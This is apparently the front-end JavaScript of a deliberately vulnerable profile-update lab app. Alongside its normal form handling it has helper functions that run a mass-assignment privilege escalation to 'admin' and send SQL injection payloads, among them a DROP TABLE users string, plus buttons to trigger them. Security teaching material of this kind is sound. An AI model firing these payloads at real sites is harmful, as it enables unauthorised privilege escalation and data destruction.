// Profile API JavaScript
class ProfileAPI {
    constructor(baseUrl) {
        this.baseUrl = baseUrl;
        this.apiEndpoint = baseUrl + '/api/profile/update.php';
    }

    // Update profile using API
    async updateProfile(formData, debug = false) {
        try {
            // Add debug flag if requested
            if (debug) {
                formData.debug = true;
            }

            console.log('Sending request to:', this.apiEndpoint);
            console.log('Request data:', formData);

            const response = await fetch(this.apiEndpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(formData)
            });

            console.log('Response status:', response.status);
            console.log('Response headers:', response.headers);

            // Get response text first to debug
            const responseText = await response.text();
            console.log('Raw response:', responseText);

            // Try to parse as JSON
            let result;
            try {
                result = JSON.parse(responseText);
            } catch (parseError) {
                console.error('JSON parse error:', parseError);
                return {
                    success: false,
                    message: 'Invalid JSON response from server',
                    debug: {
                        responseText: responseText,
                        parseError: parseError.message
                    }
                };
            }

            return result;

        } catch (error) {
            console.error('Network error:', error);
            return {
                success: false,
                message: 'Network error: ' + error.message,
                debug: {
                    error: error.toString()
                }
            };
        }
    }

    // Mass assignment attack helper
    async massAssignmentAttack(userId, targetRole = 'admin') {
        const maliciousData = {
            name: 'Hacker',
            email: 'hacker@evil.com',
            phone: '123456789',
            role: targetRole,
            is_verified: 1,
            debug: true
        };

        console.log('🚨 Performing mass assignment attack...');
        console.log('Payload:', maliciousData);

        const result = await this.updateProfile(maliciousData, true);
        
        if (result.success && result.privilege_escalation) {
            console.log('✅ Mass assignment successful! Role escalated to:', targetRole);
        } else {
            console.log('❌ Mass assignment failed:', result.message);
        }

        return result;
    }

    // SQL injection attack helper
    async sqlInjectionAttack() {
        const sqlPayloads = [
            "'; UPDATE users SET role='admin' WHERE id=1; --",
            "'; DROP TABLE users; --",
            "' OR 1=1 --"
        ];

        console.log('💉 Testing SQL injection attacks...');

        for (let i = 0; i < sqlPayloads.length; i++) {
            const payload = sqlPayloads[i];
            console.log(`Testing payload ${i + 1}: ${payload}`);

            const result = await this.updateProfile({
                name: payload,
                debug: true
            });

            console.log('Result:', result);
        }
    }
}

// Initialize API when page loads
document.addEventListener('DOMContentLoaded', function() {
    const profileAPI = new ProfileAPI(BASE_URL);
    
    // Make API available globally for testing
    window.profileAPI = profileAPI;

    // Handle form submission
    const profileForm = document.getElementById('profileForm');
    if (profileForm) {
        profileForm.addEventListener('submit', async function(e) {
            e.preventDefault();

            const formData = new FormData(this);
            const jsonData = {};

            // Convert FormData to JSON, skip file uploads for now
            for (let [key, value] of formData.entries()) {
                if (key !== 'avatar') { // Skip file upload for JSON API
                    jsonData[key] = value;
                }
            }

            // Show loading state
            const submitBtn = this.querySelector('button[type="submit"]');
            const originalText = submitBtn.innerHTML;
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Updating...';
            submitBtn.disabled = true;

            try {
                console.log('Sending data:', jsonData);
                const result = await profileAPI.updateProfile(jsonData);
                console.log('API Response:', result);

                if (result.success) {
                    showAlert('success', result.message);

                    // Show privilege escalation warning
                    if (result.privilege_escalation) {
                        showAlert('warning', '🚨 Privilege escalation detected! Role was changed via mass assignment.');
                    }

                    // Reload page to show updated data
                    setTimeout(() => {
                        window.location.reload();
                    }, 2000);
                } else {
                    // If API fails, try fallback to traditional form submission
                    if (result.message && result.message.includes('JSON')) {
                        console.log('API failed, falling back to traditional form submission');
                        showAlert('warning', 'API failed, using fallback method...');

                        // Add hidden field to indicate fallback
                        const hiddenField = document.createElement('input');
                        hiddenField.type = 'hidden';
                        hiddenField.name = 'use_fallback';
                        hiddenField.value = '1';
                        this.appendChild(hiddenField);

                        // Submit form traditionally
                        this.submit();
                        return;
                    }

                    showAlert('danger', result.message);
                    console.error('API Error:', result);
                }

            } catch (error) {
                console.log('Network error, falling back to traditional form submission');
                showAlert('warning', 'Network error, using fallback method...');

                // Add hidden field to indicate fallback
                const hiddenField = document.createElement('input');
                hiddenField.type = 'hidden';
                hiddenField.name = 'use_fallback';
                hiddenField.value = '1';
                this.appendChild(hiddenField);

                // Submit form traditionally
                this.submit();
                return;

            } finally {
                submitBtn.innerHTML = originalText;
                submitBtn.disabled = false;
            }
        });
    }

    // Add attack buttons for testing
    addAttackButtons();
});

// Show alert message
function showAlert(type, message) {
    const alertDiv = document.createElement('div');
    alertDiv.className = `alert alert-${type} alert-dismissible fade show`;
    alertDiv.innerHTML = `
        ${message}
        <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
    `;
    
    const container = document.querySelector('.card-body');
    container.insertBefore(alertDiv, container.firstChild);
    
    // Auto dismiss after 5 seconds
    setTimeout(() => {
        alertDiv.remove();
    }, 5000);
}

// Add attack testing buttons (for educational purposes)


// Test functions
async function testMassAssignment() {
    const result = await window.profileAPI.massAssignmentAttack();
    document.getElementById('testResults').innerHTML = `
        <div class="alert alert-info">
            <strong>Mass Assignment Test Result:</strong><br>
            <pre>${JSON.stringify(result, null, 2)}</pre>
        </div>
    `;
}

async function testSQLInjection() {
    await window.profileAPI.sqlInjectionAttack();
    document.getElementById('testResults').innerHTML = `
        <div class="alert alert-warning">
            <strong>SQL Injection tests completed.</strong> Check browser console for results.
        </div>
    `;
}

function showAPIUsage() {
    document.getElementById('testResults').innerHTML = `
        <div class="alert alert-info">
            <strong>API Usage Examples:</strong><br>
            <code>
            // Normal update<br>
            profileAPI.updateProfile({name: 'New Name', email: 'new@email.com'});<br><br>
            
            // Mass assignment attack<br>
            profileAPI.updateProfile({name: 'Hacker', role: 'admin'});<br><br>
            
            // With debug info<br>
            profileAPI.updateProfile({name: 'Test'}, true);
            </code>
        </div>
    `;
}
